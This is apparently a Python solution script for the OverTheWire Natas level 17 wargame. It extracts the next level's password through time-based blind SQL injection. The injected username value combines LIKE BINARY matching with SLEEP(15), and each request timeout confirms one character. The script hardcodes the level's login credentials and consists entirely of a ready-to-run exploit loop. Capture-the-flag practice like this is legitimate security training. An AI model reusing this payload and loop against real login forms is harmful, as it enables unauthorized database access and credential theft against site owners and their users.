
import requests

alnums = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
passwd = ""
auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

for i in range(len(auth[1])):
    for char in alnums:
        data = {
            "username": f'natas18" AND password LIKE BINARY "{passwd}{char}%" AND SLEEP(15) #'}
        # print(data["username"])
        try:
            req = requests.post(f'http://natas17.natas.labs.overthewire.org/index.php',
                                auth=auth, data=data, timeout=2
                                )
        except requests.exceptions.Timeout:
            passwd += char
            print("Passwd", passwd)
            break

print("Final Passwd", passwd)
